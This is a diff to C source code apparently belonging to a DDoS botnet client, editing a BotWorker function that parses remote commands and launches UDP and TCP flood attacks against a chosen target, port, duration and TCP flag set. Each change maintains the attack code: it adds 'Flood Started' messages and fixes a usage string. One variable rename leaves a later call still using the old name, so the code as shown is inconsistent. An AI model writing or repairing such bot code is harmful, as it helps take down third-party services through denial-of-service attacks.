@@ -826,16 +826,17 @@ void *BotWorker(int argc, char *argv[ ], void *sock) {
                                            int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
                                            if (listFork()) { return; }
                                            sendUDP(target, port, time, packetsize, pollinterval);
+                                           printf("UDP Flood Started!");
 				           continue;
 					}
                                         if(!strcmp(argv[0], "TCP")) {
 
                                            if(argc < 5)
                                            {
-                                                       printf(TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
+                                                       printf("TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                        return;
                                            }
-			                   unsigned char *target = argv[1];
+			                   unsigned char *ip = argv[1];
                                            int port = atoi(argv[2]);
                                            int time = atoi(argv[3]);
                                            unsigned char *flags = argv[4];
@@ -843,6 +844,7 @@ void *BotWorker(int argc, char *argv[ ], void *sock) {
                                            int psize = argc > 5 ? atoi(argv[5]) : 0;
                                            if (listFork()) { return; }
                                            sendTCP(target, port, time, flags, psize, pollinterval);
+                                           printf("TCP Flood Started!");
 				           continue;
 					}
 			if(strstr(buf, "CLEAR")) {
